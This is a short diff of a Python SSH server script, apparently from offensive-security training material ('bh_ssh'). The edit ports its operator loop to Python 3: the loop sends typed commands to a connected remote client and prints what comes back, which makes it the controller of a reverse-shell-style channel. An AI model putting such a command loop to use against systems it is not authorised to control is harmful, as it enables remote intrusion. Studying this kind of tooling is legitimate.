@@ -52,17 +52,17 @@ def main():
             print('[!] no channel is opened before the given timeout')
             
         print('[+] Authenticated!')
-        print(chan.recv(1024))
+        print(chan.recv(1024).decode())
         chan.send(b'Welcome to bh_ssh')
 
         while True:
             try:
-                command = input("Enter command: ").strip('\n')
-                if command != 'exit':
-                    chan.send(command.encode())
-                    print(chan.recv(1024) + '\n')
+                command = input("Enter command: ").strip('\n').encode()
+                if command != b'exit':
+                    chan.send(command)
+                    print(chan.recv(1024).decode() + '\n')
                 else:
-                    chan.send('exit')
+                    chan.send(b'exit')
                     print('exiting')
                     bhSession.close()
                     raise Exception('exit')
